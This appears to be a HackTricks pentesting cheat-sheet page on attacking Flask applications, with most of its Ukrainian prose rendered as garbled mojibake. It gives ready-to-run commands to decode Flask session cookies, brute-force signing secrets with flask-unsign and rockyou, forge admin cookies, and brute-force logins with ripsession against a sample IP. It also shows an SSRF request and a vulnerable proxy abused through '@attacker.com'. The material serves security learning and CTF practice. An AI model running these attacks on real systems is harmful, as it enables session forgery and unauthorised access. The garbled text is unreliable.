# Flask

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

**–ú–æ–∂–ª–∏–≤–æ, —è–∫—â–æ –≤–∏ –≥—Ä–∞—î—Ç–µ –≤ CTF, –¥–æ–¥–∞—Ç–æ–∫ Flask –±—É–¥–µ –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**.**

## Cookies

–Ü–º'—è —Å–µ—Å—ñ—ó –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è cookie - **`session`**.

### Decoder

–û–Ω–ª–∞–π–Ω –¥–µ–∫–æ–¥–µ—Ä cookie Flask: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manual

–û—Ç—Ä–∏–º–∞–π—Ç–µ –ø–µ—Ä—à—É —á–∞—Å—Ç–∏–Ω—É cookie –¥–æ –ø–µ—Ä—à–æ—ó –∫—Ä–∞–ø–∫–∏ —Ç–∞ –¥–µ–∫–æ–¥—É–π—Ç–µ —ó—ó –≤ Base64.
```bash
echo "ImhlbGxvIg" | base64 -d
```
The cookie —Ç–∞–∫–æ–∂ –ø—ñ–¥–ø–∏—Å—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–æ–ª—è

### **Flask-Unsign**

–ö–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è, –¥–µ–∫–æ–¥—É–≤–∞–Ω–Ω—è, –±—Ä—É—Ç—Ñ–æ—Ä—Å—É —Ç–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Å—ñ–π–Ω–∏—Ö –∫—É–∫—ñ–≤ Flask-–¥–æ–¥–∞—Ç–∫—É —à–ª—è—Ö–æ–º –≤–≥–∞–¥—É–≤–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç–Ω–∏—Ö –∫–ª—é—á—ñ–≤.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **–î–µ–∫–æ–¥—É–≤–∞—Ç–∏ Cookie**
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **–ë—Ä—É—Ç—Ñ–æ—Ä—Å**
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **–ü—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è**
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### –ü—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞—Å—Ç–∞—Ä—ñ–ª–∏—Ö (—Å—Ç–∞—Ä–∏—Ö –≤–µ—Ä—Å—ñ–π)
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

–ö–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫ –¥–ª—è –±—Ä—É—Ç—Ñ–æ—Ä—Å—É –≤–µ–±—Å–∞–π—Ç—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫—É–∫–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é flask-unsign.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi –≤ Flask —Å–µ—Å—ñ–π–Ω–∏—Ö –∫—É–∫–∞—Ö –∑ SQLmap

[**–¶–µ–π –ø—Ä–∏–∫–ª–∞–¥**](../../pentesting-web/sql-injection/sqlmap/#eval) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –æ–ø—Ü—ñ—é sqlmap `eval` –¥–ª—è **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –ø—ñ–¥–ø–∏—Å—É–≤–∞–Ω–Ω—è payload'—ñ–≤ sqlmap** –¥–ª—è flask, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—ñ–¥–æ–º–∏–π —Å–µ–∫—Ä–µ—Ç.

## Flask –ø—Ä–æ–∫—Å—ñ –¥–ª—è SSRF

[**–£ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ Flask –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–∏—Ç, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ —Å–∏–º–≤–æ–ª—É "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
–Ø–∫–∏–π –∑ –Ω–∞–≤–µ–¥–µ–Ω–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—ó–≤:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
–ú–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–≤–µ—Å—Ç–∏ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç "@attacker.com", —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **SSRF**.

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=flask), —â–æ–± –ª–µ–≥–∫–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏**, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ **–Ω–∞–π—Å—É—á–∞—Å–Ω—ñ—à–∏–º–∏** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=flask" %}

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
